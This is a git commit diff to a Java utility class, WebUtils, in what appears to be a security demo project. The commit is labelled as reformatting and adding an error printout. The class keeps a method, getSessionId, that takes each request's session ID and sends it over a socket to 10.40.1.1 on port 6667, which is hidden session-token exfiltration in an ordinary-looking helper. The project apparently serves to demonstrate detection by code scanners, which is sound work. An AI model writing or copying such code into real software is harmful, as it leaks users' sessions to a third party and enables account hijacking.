ac8b98a9f1f88a3aae1700133805536e2ccc83a1
Justin <justin.chi@sonarsource.com>
2024-04-27 15:45:26 +0800

    print out error message

--- src/main/java/demo/security/util/WebUtils.java
+++ src/main/java/demo/security/util/WebUtils.java
@@ -9,28 +9,29 @@ import java.nio.charset.StandardCharsets;
 
 public class WebUtils {
 
-    public void addCookie(HttpServletResponse response, String name, String value) {
-        Cookie c = new Cookie(name, value);
-        response.addCookie(c);
-    }
+	public void addCookie(HttpServletResponse response, String name, String value) {
+		Cookie c = new Cookie(name, value);
+		response.addCookie(c);
+	}
 
-    public static void getSessionId(HttpServletRequest request){
-        String sessionId = request.getRequestedSessionId();
-        if (sessionId != null){
-            String ip = "10.40.1.1";
-            Socket socket = null;
-            try {
-                socket = new Socket(ip, 6667);
-                socket.getOutputStream().write(sessionId.getBytes(StandardCharsets.UTF_8));
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            } finally {
-                try {
-                    socket.close();
-                } catch (IOException e) {
-                    // TODO - Handle this
-                }
-            }
-        }
-    }
+	public static void getSessionId(HttpServletRequest request) {
+		String sessionId = request.getRequestedSessionId();
+		if (sessionId != null) {
+			String ip = "10.40.1.1";
+			Socket socket = null;
+			try {
+				socket = new Socket(ip, 6667);
+				socket.getOutputStream().write(sessionId.getBytes(StandardCharsets.UTF_8));
+			} catch (IOException e) {
+				System.out.println(e.getMessage());
+				throw new RuntimeException(e);
+			} finally {
+				try {
+					socket.close();
+				} catch (IOException e) {
+					// TODO - Handle this
+				}
+			}
+		}
+	}
 }
